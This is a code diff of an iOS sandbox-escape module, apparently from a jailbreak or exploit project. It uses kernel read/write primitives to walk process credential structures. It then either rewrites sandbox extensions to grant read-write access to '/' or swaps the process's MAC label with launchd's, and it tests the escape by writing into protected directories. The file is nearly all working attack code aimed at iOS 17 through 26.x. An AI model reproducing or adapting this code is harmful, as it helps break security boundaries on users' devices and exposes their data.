@@ -1,10 +1,15 @@
 /*
  * sandbox_escape.m — Sandbox escape via kernel memory patching
  *
- * Walk proc_ro → ucred → cr_label → sandbox → ext_set → ext_table
- * Patch extension paths to "/", rewrite class to "com.apple.app-sandbox.read-write"
- * Fill all 16 hash slots → full R+W filesystem access
- * Based on 18.3_sandbox/root.m by CrazyMind90.
+ * Uses the kexploit framework's dynamically-computed offsets (offsets.h/m)
+ * which are specific to each iOS version + CPU family (17.0 through 26.x).
+ *
+ * Two approaches:
+ *   1. ext_set patching — rewrite sandbox extension data to "/" + "read-write"
+ *   2. MAC label swap — replace our cr_label with launchd's (no sandbox at all)
+ *
+ * The label swap is more reliable because it only needs to find launchd's label
+ * and write one pointer, vs. ext_set requiring correct sandbox struct layout.
  */
 
 #import <Foundation/Foundation.h>
@@ -12,6 +17,7 @@
 #include <unistd.h>
 #include <errno.h>
 #include <sys/stat.h>
+#include <string.h>
 #include "sandbox_escape.h"
 #include "kexploit/kexploit_opa334.h"
 #include "kexploit/krw.h"
@@ -22,27 +28,10 @@ extern void early_kread(uint64_t where, void *read_buf, size_t size);
 
 #define KRW_LEN 0x20
 
-// Verified offsets (IDA binary analysis across 6 kernelcaches)
-#define OFF_PROC_PROC_RO       0x18  // proc → proc_ro (stable 17.0-26.x)
-#define OFF_PROC_RO_UCRED      0x20  // proc_ro → p_ucred (verified all versions)
-#define OFF_UCRED_CR_LABEL     0x78  // ucred → cr_label (KDK struct dump)
-#define OFF_LABEL_SANDBOX      0x10  // label → sandbox (MAC l_perpolicy[1])
-#define OFF_SANDBOX_EXT_SET    0x10  // sandbox → ext_set
-#define OFF_EXT_DATA           0x40  // ext → data_addr
-#define OFF_EXT_DATALEN        0x48  // ext → data_len
-
-// posix_cred lives inside ucred at +0x18 (16B cr_link + 8B cr_ref).
-// Derived from OFF_UCRED_CR_LABEL=0x78 and sizeof(posix_cred)=0x60.
-#define OFF_UCRED_CR_POSIX     0x18
-#define OFF_POSIX_CR_UID       0x00
-#define OFF_POSIX_CR_RUID      0x04
-#define OFF_POSIX_CR_SVUID     0x08
-#define OFF_POSIX_CR_NGROUPS   0x0C
-#define OFF_POSIX_CR_GROUPS_0  0x10  // first group (cr_groups[0])
-#define OFF_POSIX_CR_RGID      0x50
-#define OFF_POSIX_CR_SVGID     0x54
-#define OFF_POSIX_CR_GMUID     0x58
-#define OFF_POSIX_CR_FLAGS     0x5C
+// ext_set offset within the sandbox struct — stable across all iOS 17-26
+#define OFF_SANDBOX_EXT_SET    0x10
+#define OFF_EXT_DATA           0x40
+#define OFF_EXT_DATALEN        0x48
 
 #ifdef __arm64e__
 static uint64_t __attribute((naked)) __xpaci_sbx(uint64_t a) {
@@ -53,16 +42,12 @@ static uint64_t __attribute((naked)) __xpaci_sbx(uint64_t a) {
 #define __xpaci_sbx(x) (x)
 #endif
 
-extern uint64_t VM_MIN_KERNEL_ADDRESS;
-extern uint64_t pac_mask;
-
 #define S(x) ({ uint64_t _v = __xpaci_sbx(x); \
     ((_v >> 32) > 0xFFFF ? (_v | pac_mask) : _v); })
 #define K(x) ((x) > VM_MIN_KERNEL_ADDRESS)
 
-#pragma mark - Extension patching
+#pragma mark - Extension patching (single ext → path="/", class=read-write)
 
-// Patch BOTH path->"/" AND class->read-write for a single extension
 static int patch_ext_full(uint64_t ext) {
     if (!K(ext)) return -1;
 
@@ -75,14 +60,12 @@ static int patch_ext_full(uint64_t ext) {
         early_kwrite32bytes(da, buf);
     }
 
-    // Set data_len = 1 (just "/") and extra field
     uint8_t chunk[KRW_LEN];
     early_kread(ext + OFF_EXT_DATA, chunk, KRW_LEN);
     *(uint64_t*)(chunk + 0x08) = 1;
     *(uint64_t*)(chunk + 0x10) = 0xFFFFFFFFFFFFFFFFULL;
     early_kwrite32bytes(ext + OFF_EXT_DATA, chunk);
 
-    // Set class to read-write
     da = early_kread64(ext + OFF_EXT_DATA);
     if (!K(da)) return -1;
 
@@ -95,14 +78,12 @@ static int patch_ext_full(uint64_t ext) {
     return 0;
 }
 
-// Walk an entire extension chain, patching path+class on EVERY entry
 static int patch_chain_full(uint64_t hdr) {
     int n = 0;
     for (int i = 0; i < 64 && K(hdr); i++) {
         uint64_t ext = S(early_kread64(hdr + 0x8));
         if (K(ext)) {
             if (patch_ext_full(ext) == 0) n++;
-            // Also set hdr+0x10 to point to class string (cached reference)
             uint64_t da = early_kread64(ext + OFF_EXT_DATA);
             if (K(da)) {
                 uint8_t hb[KRW_LEN];
@@ -118,64 +99,36 @@ static int patch_chain_full(uint64_t hdr) {
     return n;
 }
 
-#pragma mark - Main entry
+#pragma mark - Approach 1: ext_set patching using framework offsets
 
 int sandbox_escape(uint64_t self_proc) {
     if (!self_proc) { NSLog(@"[SBX] self_proc is NULL"); return -1; }
 
-    uint64_t proc_ro_raw = early_kread64(self_proc + OFF_PROC_PROC_RO);
-    uint64_t proc_ro = S(proc_ro_raw);
-    NSLog(@"[SBX] self_proc=0x%llx proc_ro_raw=0x%llx proc_ro=0x%llx", self_proc, proc_ro_raw, proc_ro);
-    if (!K(proc_ro)) { NSLog(@"[SBX] proc_ro invalid"); return -1; }
-
-    // Scan proc_ro for ucred — offset varies by iOS build.
-    // p_ucred is an SMR pointer. Dump offsets 0x10-0x40 to find it.
-    NSLog(@"[SBX] Scanning proc_ro for ucred...");
-    uint64_t ucred = 0;
-    for (uint32_t off = 0x10; off <= 0x40; off += 0x8) {
-        uint64_t raw = early_kread64(proc_ro + off);
-        uint64_t smr = kread_smrptr(proc_ro + off);
-        uint64_t pac = S(raw);
-        NSLog(@"[SBX]   proc_ro+0x%x: raw=0x%llx smr=0x%llx pac=0x%llx", off, raw, smr, pac);
-
-        // Check if smr-decoded value looks like ucred (cr_label at +0x78 is a kernel ptr)
-        if (K(smr)) {
-            uint64_t maybe_label = S(early_kread64(smr + 0x78));
-            if (K(maybe_label)) {
-                uint64_t maybe_sandbox = S(early_kread64(maybe_label + 0x10));
-                if (K(maybe_sandbox)) {
-                    NSLog(@"[SBX] Found ucred at proc_ro+0x%x (SMR) = 0x%llx", off, smr);
-                    ucred = smr;
-                    break;
-                }
-            }
-        }
-        // Also try PAC-stripped
-        if (!ucred && K(pac)) {
-            uint64_t maybe_label = S(early_kread64(pac + 0x78));
-            if (K(maybe_label)) {
-                uint64_t maybe_sandbox = S(early_kread64(maybe_label + 0x10));
-                if (K(maybe_sandbox)) {
-                    NSLog(@"[SBX] Found ucred at proc_ro+0x%x (PAC) = 0x%llx", off, pac);
-                    ucred = pac;
-                    break;
-                }
-            }
-        }
+    // Use framework's proc_get_cred_label which uses dynamically-computed
+    // offsets (off_proc_p_proc_ro, off_proc_ro_p_ucred, off_ucred_cr_label)
+    // specific to the running iOS version + CPU family.
+    uint64_t label = proc_get_cred_label(self_proc);
+    if (!K(label)) {
+        NSLog(@"[SBX] proc_get_cred_label failed (label=0x%llx)", label);
+        return -1;
     }
-    if (!K(ucred)) { NSLog(@"[SBX] ucred not found in proc_ro"); return -1; }
+    NSLog(@"[SBX] label=0x%llx (via framework offsets)", label);
 
-    uint64_t label = S(early_kread64(ucred + OFF_UCRED_CR_LABEL));
-    if (!K(label)) { NSLog(@"[SBX] cr_label invalid"); return -1; }
+    // Get sandbox from label using framework's label_get_sandbox
+    uint64_t sandbox = label_get_sandbox(label);
+    if (!K(sandbox)) {
+        NSLog(@"[SBX] label_get_sandbox failed (sandbox=0x%llx)", sandbox);
+        return -1;
+    }
+    NSLog(@"[SBX] sandbox=0x%llx (via framework offsets)", sandbox);
 
-    uint64_t sandbox = S(early_kread64(label + OFF_LABEL_SANDBOX));
-    if (!K(sandbox)) { NSLog(@"[SBX] sandbox invalid"); return -1; }
-
+    // ext_set offset (0x10) is stable across all iOS 17-26
     uint64_t ext_set = S(early_kread64(sandbox + OFF_SANDBOX_EXT_SET));
-    if (!K(ext_set)) { NSLog(@"[SBX] ext_set invalid"); return -1; }
-
-    NSLog(@"[SBX] proc_ro=0x%llx ucred=0x%llx label=0x%llx sandbox=0x%llx ext_set=0x%llx",
-          proc_ro, ucred, label, sandbox, ext_set);
+    if (!K(ext_set)) {
+        NSLog(@"[SBX] ext_set invalid at sandbox+0x%x", OFF_SANDBOX_EXT_SET);
+        return -1;
+    }
+    NSLog(@"[SBX] ext_set=0x%llx", ext_set);
 
     int patched = 0;
     for (int s = 0; s < 16; s++) {
@@ -184,6 +137,7 @@ int sandbox_escape(uint64_t self_proc) {
     }
     NSLog(@"[SBX] Patched %d extensions with path=/ class=read-write", patched);
 
+    // Fill empty hash slots
     uint64_t src = 0;
     for (int s = 0; s < 16 && !src; s++) {
         uint64_t h = S(early_kread64(ext_set + s * 8));
@@ -198,120 +152,102 @@ int sandbox_escape(uint64_t self_proc) {
         NSLog(@"[SBX] Filled %d empty hash slots with R+W extension", filled);
     }
 
-    // Verify: try to create a file in /var/mobile/Library (sandbox-blocked for most apps)
-    // If this succeeds, sandbox patching is working.
-    uint64_t verify_ext_set = S(early_kread64(sandbox + OFF_SANDBOX_EXT_SET));
-    NSLog(@"[SBX] Verification: ext_set after patch = 0x%llx", verify_ext_set);
+    // Verify: try writing to sandbox-blocked paths
+    {
+        int fd_w = open("/var/mobile/Library/.sbx_rw_test", O_WRONLY | O_CREAT | O_TRUNC, 0644);
+        if (fd_w >= 0) { close(fd_w); unlink("/var/mobile/Library/.sbx_rw_test"); }
 
-    int fd_w = open("/var/mobile/Library/.sbx_rw_test", O_WRONLY | O_CREAT | O_TRUNC, 0644);
-    if (fd_w >= 0) { close(fd_w); unlink("/var/mobile/Library/.sbx_rw_test"); }
+        if (fd_w >= 0) {
+            NSLog(@"[SBX] *** SANDBOX ESCAPED (R+W to /var/mobile/Library/) ***");
+            return 0;
+        }
 
-    if (fd_w >= 0) {
-        NSLog(@"[SBX] *** SANDBOX ESCAPED (R+W to /var/mobile/Library/) ***");
-        return 0;
+        fd_w = open("/Library/.sbx_rw_test", O_WRONLY | O_CREAT | O_TRUNC, 0644);
+        if (fd_w >= 0) { close(fd_w); unlink("/Library/.sbx_rw_test"); }
+
+        if (fd_w >= 0) {
+            NSLog(@"[SBX] *** SANDBOX ESCAPED (R+W to /Library/) ***");
+            return 0;
+        }
+
+        NSLog(@"[SBX] ext_set write verification failed (errno=%d: %s)", errno, strerror(errno));
+        NSLog(@"[SBX] %d extensions patched but sandbox still blocking writes", patched);
     }
 
-    // Fallback verification: try writing to /Library (normally fully blocked)
-    fd_w = open("/Library/.sbx_rw_test", O_WRONLY | O_CREAT | O_TRUNC, 0644);
-    if (fd_w >= 0) { close(fd_w); unlink("/Library/.sbx_rw_test"); }
-
-    if (fd_w >= 0) {
-        NSLog(@"[SBX] *** SANDBOX ESCAPED (R+W to /Library/) ***");
-        return 0;
-    }
-
-    NSLog(@"[SBX] Sandbox escape write verification failed (errno=%d: %s)", errno, strerror(errno));
-    NSLog(@"[SBX] %d extensions were patched but sandbox may still be blocking writes", patched);
     return -1;
 }
 
-#pragma mark - UID elevation (uid=0 via direct ucred posix_cred write)
+#pragma mark - UID elevation (disabled)
 
 int sandbox_elevate_to_root(uint64_t self_proc) {
     // DISABLED: Writing uid=0 to ucred's posix_cred has proven unreliable.
-    // On iOS 17+, ucred offsets may differ between kernel builds, and writing
-    // to the wrong field corrupts the struct causing the process to crash.
-    // The sandbox_escape + apfs_own flow is sufficient for CarrierBundles access
-    // without requiring uid=0. Keeping this function as a stub for reference.
+    // The sandbox_escape + apfs_own flow is sufficient without uid=0.
     NSLog(@"[SBX] elevate: SKIPPED (uid=0 write disabled for stability)");
     return -1;
 }
 
-#pragma mark - MAC label swap (most reliable sandbox bypass)
+#pragma mark - Approach 2: MAC label swap (more reliable)
 
-// The sandbox extension patching approach (old sandbox_escape) patches ext_set
-// data in-place. On iOS 17+ this may not take effect because:
-//   - ext_set offsets may differ between builds
-//   - The kernel may cache extension data elsewhere
-//
-// This function takes a different approach: swap our entire MAC label
-// (cr_label in ucred) with launchd's label. launchd is the init process
-// and has NO sandbox restrictions whatsoever. By using launchd's label,
-// we inherit its unrestricted MAC profile.
-//
-// On success, the calling process is completely unrestricted by the sandbox.
 int sandbox_label_swap(uint64_t self_proc) {
     if (!self_proc) { NSLog(@"[SBX-LBL] self_proc is NULL"); return -1; }
 
-    // Step 1: Find our ucred by scanning proc_ro
-    uint64_t our_proc_ro = S(early_kread64(self_proc + OFF_PROC_PROC_RO));
-    if (!K(our_proc_ro)) { NSLog(@"[SBX-LBL] our proc_ro invalid"); return -1; }
-
-    uint64_t our_ucred = 0;
-    for (uint32_t off = 0x10; off <= 0x40; off += 0x8) {
-        uint64_t pac = S(early_kread64(our_proc_ro + off));
-        if (!K(pac)) continue;
-        uint64_t maybe_label = S(early_kread64(pac + OFF_UCRED_CR_LABEL));
-        if (K(maybe_label)) { our_ucred = pac; break; }
+    // Step 1: Get our MAC label using framework offsets
+    uint64_t our_label = proc_get_cred_label(self_proc);
+    if (!K(our_label)) {
+        NSLog(@"[SBX-LBL] proc_get_cred_label(self) failed (label=0x%llx)", our_label);
+        return -1;
     }
-    if (!K(our_ucred)) { NSLog(@"[SBX-LBL] our ucred not found"); return -1; }
-    uint64_t our_label = S(early_kread64(our_ucred + OFF_UCRED_CR_LABEL));
-    NSLog(@"[SBX-LBL] our ucred=0x%llx our_label=0x%llx", our_ucred, our_label);
+    NSLog(@"[SBX-LBL] our_label=0x%llx (via framework offsets)", our_label);
 
-    // Step 2: Find launchd's proc → ucred → label
+    // Step 2: Find our ucred so we can write launchd's label into it.
+    // proc_get_cred_label reads proc→proc_ro→ucred→cr_label, so we need to
+    // re-derive ucred from proc_ro.
+    uint64_t our_proc_ro = kread64(self_proc + off_proc_p_proc_ro);
+    if (!K(our_proc_ro)) { NSLog(@"[SBX-LBL] our proc_ro invalid"); return -1; }
+    uint64_t our_ucred = kread64(our_proc_ro + off_proc_ro_p_ucred);
+    if (!K(our_ucred)) { NSLog(@"[SBX-LBL] our ucred invalid"); return -1; }
+    NSLog(@"[SBX-LBL] our ucred=0x%llx", our_ucred);
+
+    // Step 3: Find launchd
     uint64_t launchd = proc_find_by_name("launchd");
     if (!launchd || launchd == (uint64_t)-1) {
-        NSLog(@"[SBX-LBL] proc_find_by_name(launchd) failed, trying pid 1");
         launchd = proc_find(1);
         if (!launchd || launchd == (uint64_t)-1) {
-            NSLog(@"[SBX-LBL] could not find launchd at all");
+            NSLog(@"[SBX-LBL] could not find launchd proc");
             return -1;
         }
     }
     NSLog(@"[SBX-LBL] launchd proc=0x%llx", launchd);
 
-    uint64_t launchd_proc_ro = S(early_kread64(launchd + OFF_PROC_PROC_RO));
-    if (!K(launchd_proc_ro)) { NSLog(@"[SBX-LBL] launchd proc_ro invalid"); return -1; }
-
-    uint64_t launchd_ucred = 0;
-    for (uint32_t off = 0x10; off <= 0x40; off += 0x8) {
-        uint64_t pac = S(early_kread64(launchd_proc_ro + off));
-        if (!K(pac)) continue;
-        uint64_t maybe_label = S(early_kread64(pac + OFF_UCRED_CR_LABEL));
-        if (K(maybe_label)) { launchd_ucred = pac; break; }
+    // Step 4: Get launchd's MAC label using framework offsets
+    uint64_t launchd_label = proc_get_cred_label(launchd);
+    if (!K(launchd_label)) {
+        NSLog(@"[SBX-LBL] proc_get_cred_label(launchd) failed (label=0x%llx)", launchd_label);
+        return -1;
     }
-    if (!K(launchd_ucred)) { NSLog(@"[SBX-LBL] launchd ucred not found"); return -1; }
-    uint64_t launchd_label = S(early_kread64(launchd_ucred + OFF_UCRED_CR_LABEL));
-    NSLog(@"[SBX-LBL] launchd ucred=0x%llx launchd_label=0x%llx", launchd_ucred, launchd_label);
+    NSLog(@"[SBX-LBL] launchd_label=0x%llx (via framework offsets)", launchd_label);
 
-    if (!K(launchd_label)) { NSLog(@"[SBX-LBL] launchd label invalid"); return -1; }
     if (our_label == launchd_label) {
         NSLog(@"[SBX-LBL] labels already identical, no swap needed");
         return 0;
     }
 
-    // Step 3: Swap our label with launchd's by writing cr_label in our ucred
-    NSLog(@"[SBX-LBL] swapping our cr_label: 0x%llx -> 0x%llx", our_label, launchd_label);
-    early_kwrite64(our_ucred + OFF_UCRED_CR_LABEL, launchd_label);
+    // Step 5: Swap — write launchd's label into our ucred's cr_label
+    NSLog(@"[SBX-LBL] swapping cr_label: 0x%llx -> 0x%llx at ucred+0x%x",
+          our_label, launchd_label, off_ucred_cr_label);
+    kwrite64(our_ucred + off_ucred_cr_label, launchd_label);
 
-    // Step 4: Verify the swap worked
-    uint64_t verify_label = S(early_kread64(our_ucred + OFF_UCRED_CR_LABEL));
+    // Step 6: Verify
+    uint64_t verify_label = kread_ptr(our_ucred + off_ucred_cr_label);
     if (verify_label != launchd_label) {
-        NSLog(@"[SBX-LBL] swap verification FAILED (readback=0x%llx)", verify_label);
+        NSLog(@"[SBX-LBL] swap verification FAILED (readback=0x%llx, expected=0x%llx)",
+              verify_label, launchd_label);
         return -1;
     }
+    NSLog(@"[SBX-LBL] swap verified: cr_label now 0x%llx (was 0x%llx)",
+          verify_label, our_label);
 
-    // Step 5: Functional verification - try writing to a sandboxed path
+    // Step 7: Functional verification
     int fd = open("/var/mobile/Library/.sbx_label_test", O_WRONLY | O_CREAT | O_TRUNC, 0644);
     if (fd >= 0) {
         close(fd); unlink("/var/mobile/Library/.sbx_label_test");
@@ -319,7 +255,6 @@ int sandbox_label_swap(uint64_t self_proc) {
         return 0;
     }
 
-    // Also try /Library (usually fully blocked)
     fd = open("/Library/.sbx_label_test", O_WRONLY | O_CREAT | O_TRUNC, 0644);
     if (fd >= 0) { close(fd); unlink("/Library/.sbx_label_test"); }
 
@@ -328,6 +263,8 @@ int sandbox_label_swap(uint64_t self_proc) {
         return 0;
     }
 
-    NSLog(@"[SBX-LBL] label swapped but write still fails (errno=%d) - label may still have restrictions", errno);
+    NSLog(@"[SBX-LBL] label swapped OK but write still fails (errno=%d: %s)",
+          errno, strerror(errno));
+    NSLog(@"[SBX-LBL] This may mean cr_label write didn't take effect (ucred in PPL region?)");
     return -1;
 }
